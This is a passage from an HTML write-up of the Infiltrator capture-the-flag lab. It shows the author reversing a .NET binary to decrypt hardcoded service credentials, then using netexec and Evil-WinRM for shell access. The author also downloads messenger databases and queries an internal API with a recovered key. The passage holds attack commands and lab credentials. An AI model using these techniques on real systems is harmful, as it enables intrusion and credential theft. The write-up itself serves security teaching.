class="s">"LDAP://dc01.infiltrator.htb"</span><span class="p">;</span> <span class="kt">string</span> <span class="n">username</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span> <span class="kt">string</span> <span class="n">password</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span> <span class="kt">string</span> <span class="n">str1</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span> <span class="kt">string</span> <span class="n">str2</span> <span class="p">=</span> <span class="s">"winrm_svc"</span><span class="p">;</span> <span class="kt">string</span> <span class="n">cipherText</span> <span class="p">=</span> <span class="s">"TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE="</span><span class="p">;</span> </code></pre></div></div> <p>Then there’s a loop that processes the args:</p> <div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">index</span> <span class="p">&lt;</span> <span class="n">args</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">index</span> <span class="p">+=</span> <span class="m">2</span><span class="p">)</span> <span class="p">{</span> <span class="k">switch</span> <span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="nf">ToLower</span><span class="p">())</span> <span class="p">{</span> <span class="k">case</span> <span class="s">"-u"</span><span class="p">:</span> <span class="n">username</span> <span class="p">=</span> <span class="n">args</span><span class="p">[</span><span class="n">index</span> <span class="p">+</span> <span class="m">1</span><span class="p">];</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s">"-p"</span><span class="p">:</span> <span class="n">password</span> <span class="p">=</span> <span class="n">args</span><span class="p">[</span><span class="n">index</span> <span class="p">+</span> <span class="m">1</span><span class="p">];</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s">"-s"</span><span class="p">:</span> <span class="n">str1</span> <span class="p">=</span> <span class="n">args</span><span class="p">[</span><span class="n">index</span> <span class="p">+</span> <span class="m">1</span><span class="p">];</span> <span class="k">break</span><span class="p">;</span> <span class="k">case</span> <span class="s">"-default"</span><span class="p">:</span> <span class="n">username</span> <span class="p">=</span> <span class="n">str2</span><span class="p">;</span> <span class="n">password</span> <span class="p">=</span> <span class="n">Decryptor</span><span class="p">.</span><span class="nf">DecryptString</span><span class="p">(</span><span class="s">"b14ca5898a4e4133bbce2ea2315a1916"</span><span class="p">,</span> <span class="n">cipherText</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> <span class="k">default</span><span class="p">:</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"Invalid argument: {0}"</span><span class="p">,</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="n">args</span><span class="p">[</span><span class="n">index</span><span class="p">]));</span> <span class="k">return</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> </code></pre></div></div> <p>If the <code class="language-plaintext highlighter-rouge">-default</code> option is given, it uses the user winrm_svc with a password that’s decrypted from some base64-encoded data and the <code class="language-plaintext highlighter-rouge">cipherText</code>.</p> <p>The rest of the code connects using a C# library to LDAP, queries information, and prints it:</p> <div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="p">(!</span><span class="kt">string</span><span class="p">.</span><span class="nf">IsNullOrEmpty</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="p">!</span><span class="kt">string</span><span class="p">.</span><span class="nf">IsNullOrEmpty</span><span class="p">(</span><span class="n">password</span><span class="p">))</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(!</span><span class="kt">string</span><span class="p">.</span><span class="nf">IsNullOrEmpty</span><span class="p">(</span><span class="n">str1</span><span class="p">))</span> <span class="p">{</span> <span class="k">try</span> <span class="p">{</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Attempting Service Connection..."</span><span class="p">);</span> <span class="k">using</span> <span class="p">(</span><span class="n">DirectoryEntry</span> <span class="n">searchRoot</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">DirectoryEntry</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span> <span class="p">{</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Service Connection Successful."</span><span class="p">);</span> <span class="k">using</span> <span class="p">(</span><span class="n">DirectorySearcher</span> <span class="n">directorySearcher</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">DirectorySearcher</span><span class="p">(</span><span class="n">searchRoot</span><span class="p">))</span> <span class="p">{</span> <span class="n">directorySearcher</span><span class="p">.</span><span class="n">Filter</span> <span class="p">=</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"(SAMAccountName={0})"</span><span class="p">,</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="n">str1</span><span class="p">);</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"Search for {0} user..."</span><span class="p">,</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="n">str1</span><span class="p">));</span> <span class="n">SearchResult</span> <span class="n">one</span> <span class="p">=</span> <span class="n">directorySearcher</span><span class="p">.</span><span class="nf">FindOne</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="n">one</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"User found. Details:"</span><span class="p">);</span> <span class="n">DirectoryEntry</span> <span class="n">directoryEntry</span> <span class="p">=</span> <span class="n">one</span><span class="p">.</span><span class="nf">GetDirectoryEntry</span><span class="p">();</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"Name: {0}"</span><span class="p">,</span> <span class="n">directoryEntry</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="s">"cn"</span><span class="p">].</span><span class="n">Value</span><span class="p">));</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"EmailID: {0}"</span><span class="p">,</span> <span class="n">directoryEntry</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="s">"mail"</span><span class="p">].</span><span class="n">Value</span><span class="p">));</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"Telephone Extension: {0}"</span><span class="p">,</span> <span class="n">directoryEntry</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="s">"telephoneNumber"</span><span class="p">].</span><span class="n">Value</span><span class="p">));</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"Department: {0}"</span><span class="p">,</span> <span class="n">directoryEntry</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="s">"department"</span><span class="p">].</span><span class="n">Value</span><span class="p">));</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"Job Title: {0}"</span><span class="p">,</span> <span class="n">directoryEntry</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="s">"title"</span><span class="p">].</span><span class="n">Value</span><span class="p">));</span> <span class="k">return</span><span class="p">;</span> <span class="p">}</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"User not found."</span><span class="p">);</span> <span class="k">return</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span> <span class="p">{</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">"An error occurred: {0}"</span><span class="p">,</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="n">ex</span><span class="p">.</span><span class="n">Message</span><span class="p">));</span> <span class="k">return</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="p">}</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"Usage: UserExplorer.exe -u &lt;username&gt; -p &lt;password&gt; -s &lt;searchedUsername&gt; [-default]"</span><span class="p">);</span> <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"To use the default credentials: UserExplorer.exe -default -s userToSearch"</span><span class="p">);</span> <span class="p">}</span> <span class="p">}</span> </code></pre></div></div> <h4 id="reversing-decryptor">Reversing Decryptor</h4> <p>The <code class="language-plaintext highlighter-rouge">Decryptor</code> class is simple:</p> <div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">class</span> <span class="nc">Decryptor</span> <span class="p">{</span> <span class="k">public</span> <span class="k">static</span> <span class="kt">string</span> <span class="nf">DecryptString</span><span class="p">(</span><span class="kt">string</span> <span class="n">key</span><span class="p">,</span> <span class="kt">string</span> <span class="n">cipherText</span><span class="p">)</span> <span class="p">{</span> <span class="k">using</span> <span class="p">(</span><span class="n">Aes</span> <span class="n">aes</span> <span class="p">=</span> <span class="n">Aes</span><span class="p">.</span><span class="nf">Create</span><span class="p">())</span> <span class="p">{</span> <span class="n">aes</span><span class="p">.</span><span class="n">Key</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">key</span><span class="p">);</span> <span class="n">aes</span><span class="p">.</span><span class="n">IV</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">16</span><span class="p">];</span> <span class="n">ICryptoTransform</span> <span class="n">decryptor</span> <span class="p">=</span> <span class="n">aes</span><span class="p">.</span><span class="nf">CreateDecryptor</span><span class="p">(</span><span class="n">aes</span><span class="p">.</span><span class="n">Key</span><span class="p">,</span> <span class="n">aes</span><span class="p">.</span><span class="n">IV</span><span class="p">);</span> <span class="k">using</span> <span class="p">(</span><span class="n">MemoryStream</span> <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="nf">FromBase64String</span><span class="p">(</span><span class="n">cipherText</span><span class="p">)))</span> <span class="p">{</span> <span class="k">using</span> <span class="p">(</span><span class="n">CryptoStream</span> <span class="n">cryptoStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">CryptoStream</span><span class="p">((</span><span class="n">Stream</span><span class="p">)</span> <span class="n">memoryStream</span><span class="p">,</span> <span class="n">decryptor</span><span class="p">,</span> <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Read</span><span class="p">))</span> <span class="p">{</span> <span class="k">using</span> <span class="p">(</span><span class="n">StreamReader</span> <span class="n">streamReader</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StreamReader</span><span class="p">((</span><span class="n">Stream</span><span class="p">)</span> <span class="n">cryptoStream</span><span class="p">))</span> <span class="k">return</span> <span class="n">streamReader</span><span class="p">.</span><span class="nf">ReadToEnd</span><span class="p">();</span> <span class="p">}</span> <span class="p">}</span> <span class="p">}</span> <span class="p">}</span> <span class="p">}</span> </code></pre></div></div> <p>The key is UTF-8 (not hex), and cipher text is base64 decoded and then passed to AES.</p> <h4 id="decrypting-secret">Decrypting Secret</h4> <p>CyberChef <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'UTF8','string':'b14ca5898a4e4133bbce2ea2315a1916'%7D,%7B'option':'Hex','string':'00000000000000000000000000000000'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&amp;input=VEdsdTIyb284R0lIUmtKQkJwWjFuUS94NmwzNk1WajNVa3Y0SHc4NnFHRT0">can handle</a> base64-decode and AES decrypt:</p> <picture> <source type="image/webp" srcset="/img/image-20240906210438639.webp" /> <img loading="lazy" src="/img/image-20240906210438639.png" alt="image-20240906210438639" class="include_image " /> </picture> <p>Interestingly, the output is a base64 encoded string. It decodes to junk:</p> <picture> <source type="image/webp" srcset="/img/image-20240906210842473.webp" /> <img loading="lazy" src="/img/image-20240906210842473.png" alt="image-20240906210842473" class="include_image " /> </picture> <p>But if I decrypt again, it returns a string:</p> <picture> <source type="image/webp" srcset="/img/image-20240906211139296.webp" /> <img loading="lazy" src="/img/image-20240906211139296.png" alt="image-20240906211139296" class="include_image " /> </picture> <h3 id="winrm">WinRM</h3> <p>Those creds work for both SMB and WinRM:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>netexec smb infiltrator.htb <span class="nt">-u</span> winrm_svc <span class="nt">-p</span> <span class="s1">'WinRm@$svc^!^P'</span> <span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-protocol">SMB </span><span class="go"> 10.10.11.31 445 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\winrm_svc:WinRm@$svc^!^P </span><span class="gp">oxdf@hacky$ </span>netexec winrm infiltrator.htb <span class="nt">-u</span> winrm_svc <span class="nt">-p</span> <span class="s1">'WinRm@$svc^!^P'</span> <span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb) </span><span class="netexec-protocol">WINRM </span><span class="go"> 10.10.11.31 5985 DC01 </span><span class="netexec-logsuccess">[+]</span><span class="go"> infiltrator.htb\winrm_svc:WinRm@$svc^!^P </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go"> </span></code></pre></div></div> <p>I’ll connect with Evil-WinRM:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> infiltrator.htb <span class="nt">-u</span> winrm_svc <span class="nt">-p</span> <span class="s1">'WinRm@$svc^!^P'</span> <span class="go"> Evil-WinRM shell v3.5 Info: Establishing connection to remote endpoint </span><span class="gp">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt;</span><span class="w"> </span></code></pre></div></div> <h2 id="shell-as-omartinez">Shell as O.Martinez</h2> <h3 id="enumeration-1">Enumeration</h3> <h4 id="from-shell">From Shell</h4> <p>There’s not too much new that jumps out enumerating from the shell. The user is a member of the <code class="language-plaintext highlighter-rouge">Service_Management</code> group:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\winrm_svc&gt;</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w"> </span><span class="go"> GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================== ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTIN\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group INFILTRATOR\Service_Management Group S-1-5-21-2606098828-3734741516-3625406802-1116 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\Medium Plus Mandatory Level Label S-1-16-8448 </span></code></pre></div></div> <p>There’s an <code class="language-plaintext highlighter-rouge">Output Messenger</code> directory in winrm_svc’s <code class="language-plaintext highlighter-rouge">Appdata\Roaming</code> directory:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\winrm_svc\AppData\Roaming\Output Messenger&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="go"> Directory: C:\Users\winrm_svc\AppData\Roaming\Output Messenger Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 2/25/2024 7:20 AM JAAA -a---- 2/25/2024 7:20 AM 948 OutputMessenger.log </span></code></pre></div></div> <p>The log isn’t interesting. A quick look at the files in the directory shows a bunch of images and two <code class="language-plaintext highlighter-rouge">.db3</code> files:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\winrm_svc\AppData\Roaming\Output Messenger&gt;</span><span class="w"> </span><span class="n">tree</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="go">Folder PATH listing Volume serial number is 96C7-B603 C:. ³ OutputMessenger.log ³ ÀÄÄÄJAAA ³ OM.db3 ³ OT.db3 ³ ÃÄÄÄAudios ÃÄÄÄCalendarFiles ÃÄÄÄLog ÃÄÄÄMailInbox ÃÄÄÄMailSent ÃÄÄÄReceived Files ÃÄÄÄScreenshots ÃÄÄÄTemp ³ ³ arrow_l_active.png ³ ³ arrow_l_active_d.png ³ ³ arrow_l_alert.png ³ ³ arrow_l_inactive.png ³ ³ arrow_l_inactive_d.png ³ ³ arrow_r_active.png ³ ³ arrow_r_active_d.png ³ ³ arrow_r_alert.png ³ ³ arrow_r_inactive.png ³ ³ arrow_r_inactive_d.png ³ ³ cat0_mini.png ³ ³ cat1_mini.png ³ ³ cat2_mini.png ³ ³ cat3_mini.png ³ ³ cat4_mini.png ³ ³ closegc.png ³ ³ closegc1.png ³ ³ c_anno.png ³ ³ darrow.png ³ ³ downarrow.png ³ ³ forward_icon_b_15.png ³ ³ forward_icon_w_15.png ³ ³ leave_today_16.png ³ ³ leave_tomorrow3_16.png ³ ³ load_20.gif ³ ³ Meeting.png ³ ³ message_notification.gif ³ ³ mobile2.png ³ ³ mobile_offline2.png ³ ³ network10_16.png ³ ³ network11_16.png ³ ³ network12_16.png ³ ³ network13_16.png ³ ³ network14_16.png ³ ³ network15_16.png ³ ³ network16_16.png ³ ³ network17_16.png ³ ³ network1_16.png ³ ³ network2_16_2.png ³ ³ network3_16.png ³ ³ network4_16.png ³ ³ network5_16.png ³ ³ network6_16.png ³ ³ network7_16.png ³ ³ network8_16.png ³ ³ network9_16.png ³ ³ plus_math_20.png ³ ³ plus_math_20_b.png ³ ³ poll_multi_tick.png ³ ³ poll_multi_tick_w.png ³ ³ poll_tick.png ³ ³ poll_tick_w.png ³ ³ rightarrow.png ³ ³ tickgallery.png ³ ³ trash_14.png ³ ³ trash_14_red.png ³ ³ ³ ÃÄÄÄDrive ³ ÃÄÄÄProfile ³ ³ UP1_A_1.png ³ ³ UP9_WS_9.png ³ ³ ³ ÀÄÄÄReceived Files ÀÄÄÄTheme </span></code></pre></div></div> <p>I’ll grab both files:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA&gt;</span><span class="w"> </span><span class="n">download</span><span class="w"> </span><span class="nx">OM.db3</span><span class="w"> </span><span class="go"> Info: Downloading C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA\OM.db3 to OM.db3 Info: Download successful! </span><span class="gp">*Evil-WinRM* PS C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA&gt;</span><span class="w"> </span><span class="n">download</span><span class="w"> </span><span class="nx">OT.db3</span><span class="w"> </span><span class="go"> Info: Downloading C:\Users\winrm_svc\AppData\Roaming\Output Messenger\JAAA\OT.db3 to OT.db3 Info: Download successful! </span></code></pre></div></div> <h4 id="db-enumeration">DB Enumeration</h4> <p>Both files are SQLite files:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>file <span class="k">*</span>.db3 <span class="go">OM.db3: SQLite 3.x database, last written using SQLite version 3008006, page size 1024, file counter 33, database pages 29, cookie 0xf, schema 4, UTF-8, version-valid-for 33 OT.db3: SQLite 3.x database, last written using SQLite version 3008006, page size 1024, file counter 8, database pages 13, cookie 0x6, schema 4, UTF-8, version-valid-for 8 </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">OT.db3</code> is basically empty:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="n">sqlite3</span> <span class="n">OT</span><span class="p">.</span><span class="n">db3</span> <span class="go">SQLite version 3.45.1 2024-01-30 16:01:20 Enter ".help" for usage hints. </span><span class="gp">sqlite&gt;</span><span class="w"> </span><span class="p">.</span><span class="n">tables</span> <span class="go">om_project om_project_task_users om_task_status om_project_task om_task_settings om_task_type </span><span class="gp">sqlite&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">om_project</span><span class="p">;</span> <span class="gp">sqlite&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">om_project_task</span><span class="p">;</span> <span class="gp">sqlite&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">om_project_task_users</span><span class="p">;</span> <span class="gp">sqlite&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">om_task_settings</span><span class="p">;</span> <span class="go">leave_user_sync_date|2024-02-19T22:32:29.643Z calendar_user_settings|{"Approvers":[],"ApprovedUsers":"","LeaveTypes":[{"Id":1,"Name":"Casual","Color":"#339966","IsDefault":true},{"Id":2,"Name":"Sick","Color":"#00CCFF","IsDefault":true}],"Calendar":{"OfficeStartTime":"09:00 AM","NonWorkingDays":["Sunday"],"IsViewDepartmentLeaveOnly":false,"DeleteLeave":12,"Holidays":[]}} </span><span class="gp">sqlite&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">om_task_status</span><span class="p">;</span> <span class="gp">sqlite&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">om_task_type</span><span class="p">;</span> </code></pre></div></div> <p>The tables in <code class="language-plaintext highlighter-rouge">OM.db3</code> list some having to do with chatrooms:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sqlite3 OM.db3 <span class="go">SQLite version 3.45.1 2024-01-30 16:01:20 Enter ".help" for usage hints. </span><span class="gp">sqlite&gt;</span><span class="w"> </span>.tables <span class="go">om_chatroom om_drive_files om_preset_message om_chatroom_user om_escape_message om_reminder om_custom_group_new om_hide_usergroup om_settings om_custom_group_user_new om_notes om_user_master om_custom_status om_notes_user om_user_photo </span></code></pre></div></div> <p>Very soon I will need to know the <code class="language-plaintext highlighter-rouge">roomkey</code> for a chatroom, which is a column in <code class="language-plaintext highlighter-rouge">om_chatroom</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sqlite&gt; </span><span class="p">.</span><span class="k">schema</span> <span class="n">om_chatroom</span> <span class="go">CREATE TABLE [om_chatroom] ( [chatroom_id] INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, [chatroom_name] NVARCHAR(50), [chatroom_key] NVARCHAR(50), [chatroom_new_name] NVARCHAR(100), [photo_key] NVARCHAR(100), [chatroom_new_key] NVARCHAR(100), [chatroom_notification] BOOLEAN, [updated_date] DATETIME, [leave_room] BOOLEAN, [admin_only_chat] BOOLEAN, [last_message_date] DATETIME, [is_remote_server] BOOLEAN, [remote_server_id] INTEGER, [is_active] BOOLEAN, [last_message_id] NVARCHAR(50), [pin_message] NTEXT ); </span></code></pre></div></div> <p>I’ll grab the keys:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sqlite&gt; </span><span class="k">select</span> <span class="n">chatroom_name</span><span class="p">,</span> <span class="n">chatroom_key</span> <span class="k">from</span> <span class="n">om_chatroom</span><span class="p">;</span> <span class="go">chatroom_name|chatroom_key General_chat|20240219160702@conference.com Chiefs_Marketing_chat|20240220014618@conference.com </span></code></pre></div></div> <p>There is some other data, but nothing too useful.</p> <h4 id="output-messenger">Output Messenger</h4> <p>winrm_svc is also a user in Output Messenger. I’ll log out of the client and start it again as winrm_svc. They have labels like “Services Management” and “Management and Security”:</p> <picture> <source type="image/webp" srcset="/img/image-20240907065650909.webp" /> <img loading="lazy" src="/img/image-20240907065650909.png" alt="image-20240907065650909" class="include_image " /> </picture> <p>They are in a group, Management and Security:</p> <picture> <source type="image/webp" srcset="/img/image-20240907065917074.webp" /> <img loading="lazy" src="/img/image-20240907065917074.png" alt="image-20240907065917074" class="include_image " /> </picture> <p>They have a chat history with O.Martinez:</p> <picture> <source type="image/webp" srcset="/img/image-20240907065733720.webp" /> <img loading="lazy" src="/img/image-20240907065733720.png" alt="image-20240907065733720" class="include_image " /> </picture> <p>There are two hints in this chat. The obvious one is that password is likely in the messages for that chat group. The other less obvious has to do with an issue with a popup every day at 9:00 am.</p> <p>There’s also chats with two offline users. D.Anderson has requested a password reset:</p> <picture> <source type="image/webp" srcset="/img/image-20240907065948437.webp" /> <img loading="lazy" src="/img/image-20240907065948437.png" alt="image-20240907065948437" class="include_image " /> </picture> <p>And A.Walker requested access to a group chat:</p> <picture> <source type="image/webp" srcset="/img/image-20240907070012710.webp" /> <img loading="lazy" src="/img/image-20240907070012710.png" alt="image-20240907070012710" class="include_image " /> </picture> <p>That suggests that winrm_svc has the capability to add people to group chats.</p> <p>In the Notes section, there’s a note with the subject “app management” with an API key:</p> <picture> <source type="image/webp" srcset="/img/image-20240907070122797.webp" /> <img loading="lazy" src="/img/image-20240907070122797.png" alt="image-20240907070122797" class="include_image " /> </picture> <h3 id="output-messenger-api">Output Messenger API</h3> <h4 id="authentication">Authentication</h4> <p><a href="https://support.outputmessenger.com/authentication-api/">This page</a> from the Output Messenger documentation shows how to use the API on 14125, which matches the API identified <a href="/2025/06/14/htb-infiltrator.html#api---tcp-14125">above</a>. Hitting it without auth returns an error:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl localhost:14125 <span class="go">ProxyChains-3.1 (http://proxychains.sf.net) |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:14125-&lt;&gt;&lt;&gt;-OK {"Message":"No HTTP resource was found that matches the request URI 'http://localhost:14125/'.","MessageDetail":"No route data was found for this request."} </span></code></pre></div></div> <p>An endpoint in that documentation page is <code class="language-plaintext highlighter-rouge">/api/users</code>, but it requires auth:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl localhost:14125/api/users <span class="go">ProxyChains-3.1 (http://proxychains.sf.net) |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:14125-&lt;&gt;&lt;&gt;-OK {"Message":"Request is missing authorization token."} </span></code></pre></div></div> <p>The docs show that an API key is set, which is likely what was in the note:</p> <picture> <source type="image/webp" srcset="/img/image-20240907070440537.webp" /> <img loading="lazy" src="/img/image-20240907070440537.png" alt="image-20240907070440537" class="include_image " /> </picture> <p>If that is what this API key is, I should be able to add it as an <code class="language-plaintext highlighter-rouge">API-KEY</code> header:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains curl <span class="nt">-H</span> <span class="s2">"API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG"</span> localhost:14125/api/users <span class="go">ProxyChains-3.1 (http://proxychains.sf.net) |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:14125-&lt;&gt;&lt;&gt;-OK {"rows":[{"user":"admin","displayname":"Admin","group":"Administration","role":"A","email":"","phone":"","title":"","status":"online"},{"user":"D.anderson","displayname":"D.anderson","group":"Marketing Team","role":"U","email":"anderson@infiltrator.htb","phone":"+0 123 443 699","title":"Marketing","status":"offline"},{"user":"L.clark","displayname":"L.clark","group":"Marketing Team","role":"U","email":"clark@infiltrator.htb","phone":"+0 123 